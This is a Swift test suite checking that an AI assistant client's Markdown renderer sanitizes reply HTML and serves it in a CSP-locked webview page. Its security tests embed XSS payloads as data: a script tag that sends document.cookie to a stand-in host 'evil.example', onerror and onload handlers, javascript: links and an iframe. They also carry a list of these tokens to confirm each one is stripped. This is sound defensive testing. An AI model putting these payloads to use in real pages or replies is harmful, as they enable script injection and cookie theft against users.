import Testing
import Foundation
@testable import AdeleCore

/// Spec: assistant replies reach the transcript's webview through the **shared
/// Rust pipeline** (`adele-markdown`, exported over the C ABI), not a Swift
/// reimplementation.
///
/// Why that matters here rather than only in the core: assistant output is
/// untrusted (gtk#25). A `WKWebView` handed unsanitized reply HTML is a script
/// execution surface in a window that also holds a daemon session. These tests
/// are the Swift-side proof that the sanitizer and the CSP-pinned page are on
/// the path this client actually uses — a second implementation, or a call that
/// silently returns the input unchanged, fails here.
@Suite struct MarkdownRenderTests {

    // MARK: - The render contract

    @Test func rendersTheFullCommonMarkSetTheOldNativeRendererCouldNot() {
        let html = AdeleMarkdown.fragment(
            """
            | col a | col b |
            |-------|-------|
            | 1     | 2     |

            - [ ] unchecked
            - [x] checked
              - nested

            ~~struck~~

            > quoted
            """)
        #expect(html.contains("<table>"))
        #expect(html.contains("<th>col a</th>"))
        #expect(html.contains("<td>1</td>"))
        #expect(html.contains("<del>struck</del>"))
        #expect(html.contains("<blockquote>"))
        #expect(html.contains("nested"))
    }

    @Test func rendersInlineFormattingAndFencedCode() {
        let html = AdeleMarkdown.fragment("**b** *i* `c`\n\n```swift\nlet x = 1\n```")
        #expect(html.contains("<strong>b</strong>"))
        #expect(html.contains("<em>i</em>"))
        #expect(html.contains("<pre>"))
        #expect(html.contains("let x = 1"))
    }

    @Test func emptyInputRendersEmpty() {
        #expect(AdeleMarkdown.fragment("").isEmpty)
    }

    @Test func documentIsACompleteCspLockedPage() {
        let doc = AdeleMarkdown.document("hi")
        #expect(doc.hasPrefix("<!DOCTYPE html>"))
        #expect(doc.contains("default-src 'none'"))
        #expect(doc.contains("script-src 'sha256-"))
        #expect(!doc.contains("'unsafe-inline'; script-src"))
        #expect(!doc.contains("'unsafe-eval'"))
    }

    @Test func documentBlocksRemoteImagesSoABubbleCannotBecomeATrackingPixel() {
        let doc = AdeleMarkdown.document("![x](https://evil.example/track.png)")
        #expect(doc.contains("img-src data:;"))
        #expect(!doc.contains("img-src data: https"))
    }

    // MARK: - The security contract (gtk#25's threat model, end to end)

    @Test func aScriptTagInAReplyIsStrippedButTheReplySurvives() {
        let html = AdeleMarkdown.fragment("<script>alert(1)</script>hello")
        #expect(html.contains("hello"))
        #expect(!html.lowercased().contains("<script"))
        #expect(!html.contains("alert(1)"))
    }

    @Test func anImgOnerrorHandlerIsStripped() {
        let html = AdeleMarkdown.fragment("before <img src=x onerror=alert(1)> after")
        #expect(html.contains("before"))
        #expect(html.contains("after"))
        #expect(!html.lowercased().contains("onerror"))
    }

    @Test func aJavascriptUriLinkLosesItsHref() {
        let html = AdeleMarkdown.fragment("[click me](javascript:alert(1))")
        #expect(!html.lowercased().contains("javascript:"))
        #expect(html.contains("click me"))
    }

    /// The composite case: everything the issue names, in one reply, checked at
    /// the exact boundary the webview loads.
    @Test func aHostileReplyReachesTheWebviewInert() {
        let hostile = """
            Here you go:

            <script>fetch('https://evil.example/'+document.cookie)</script>

            <img src=x onerror="alert('pwn')">

            <iframe src="javascript:alert(1)"></iframe>

            <svg onload="alert(2)"></svg>

            [link](javascript:alert(3))

            Done.
            """
        let doc = AdeleMarkdown.document(hostile)

        // Isolate the message body: everything before the page's own pinned
        // script, which legitimately contains JS.
        let scriptStart = doc.range(of: "<script>")
        let bodyStart = doc.range(of: "<body>")
        let body = String(doc[bodyStart!.upperBound..<scriptStart!.lowerBound]).lowercased()

        #expect(body.contains("here you go"))
        #expect(body.contains("done."))
        for token in [
            "<script", "onerror", "onload", "onclick", "javascript:", "<iframe", "<svg",
            "alert(", "evil.example",
        ] {
            #expect(!body.contains(token), "hostile token \(token) reached the webview")
        }
    }

    // MARK: - The host/page bridge

    @Test func bridgeNamesComeFromTheCoreSoTheyCannotDrift() {
        // The host registers a script-message handler under one name and calls
        // one global function. Both are the page's, so both are the core's.
        #expect(!AdeleMarkdown.heightHandlerName.isEmpty)
        #expect(!AdeleMarkdown.setContentFunction.isEmpty)

        let doc = AdeleMarkdown.document("hi")
        #expect(doc.contains("messageHandlers.\(AdeleMarkdown.heightHandlerName)"))
        #expect(doc.contains(AdeleMarkdown.setContentFunction))
        #expect(doc.contains("scrollHeight"))
    }

    @Test func setContentCallIsAValidSingleArgumentInvocation() {
        let call = AdeleMarkdown.setContentCall("<p>hi</p>")
        #expect(call == "\(AdeleMarkdown.setContentFunction)(\"<p>hi</p>\")")
    }

    // MARK: - JS string literal encoding
    //
    // The streaming path hands rendered HTML to the page as a JS string literal.
    // Sanitized HTML is inert as *markup*, but it is still attacker-influenced
    // *text*: an unescaped quote or backslash would break out of the literal and
    // become code in the one place the CSP cannot help, because host-evaluated
    // script is exempt from it.

    @Test func literalEscapesQuotesAndBackslashes() {
        #expect(AdeleMarkdown.jsStringLiteral(#"a"b"#) == #""a\"b""#)
        #expect(AdeleMarkdown.jsStringLiteral(#"a\b"#) == #""a\\b""#)
    }

    @Test func literalEscapesNewlinesRatherThanEmittingThemRaw() {
        let encoded = AdeleMarkdown.jsStringLiteral("a\nb\r\tc")
        #expect(!encoded.contains("\n"))
        #expect(!encoded.contains("\r"))
        #expect(encoded.contains("\\n"))
    }

    @Test func literalEscapesUnicodeLineSeparators() {
        // U+2028 / U+2029 are literal line terminators in older JS grammars and
        // JSON does not escape them, so encode them explicitly.
        let encoded = AdeleMarkdown.jsStringLiteral("a\u{2028}b\u{2029}c")
        #expect(!encoded.contains("\u{2028}"))
        #expect(!encoded.contains("\u{2029}"))
        #expect(encoded.contains("\\u2028"))
        #expect(encoded.contains("\\u2029"))
    }

    @Test func literalClosesTheScriptTagCaseToo() {
        // Defence in depth: the call is host-evaluated, not injected into a
        // <script> element, but an escaped "</script>" costs nothing and
        // survives a future change of injection site.
        let encoded = AdeleMarkdown.jsStringLiteral("</script>")
        #expect(!encoded.contains("</script>"))
    }

    @Test func literalRoundTripsThroughAnActualJsonDecode() {
        // The encoding must be valid JSON as well as valid JS, since that is
        // what makes it verifiable at all.
        let original = "he said \"hi\"\n\\ done\u{2028}"
        let encoded = AdeleMarkdown.jsStringLiteral(original)
        let decoded = try? JSONDecoder().decode(String.self, from: Data(encoded.utf8))
        #expect(decoded == original)
    }
}
